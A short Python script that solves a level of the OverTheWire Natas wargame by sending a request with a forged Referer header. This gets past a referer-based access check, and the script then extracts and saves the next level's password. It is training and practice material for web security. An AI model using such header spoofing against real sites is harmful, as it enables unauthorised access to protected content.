import requests

url="http://natas4.natas.labs.overthewire.org/"
username="natas4"
# read password from generated file
file=open('password.txt', 'r')
password=file.readline()

# set the referer
response = requests.get(url, auth=(username, password), headers={'referer': 'http://natas5.natas.labs.overthewire.org/'})

# parse the password
str="natas5"
for line in response.text.splitlines():
    if str in line:
        l=line.split()
        print(l[7])
        with open('password.txt', 'w') as f:
            f.write(l[7])
file.close()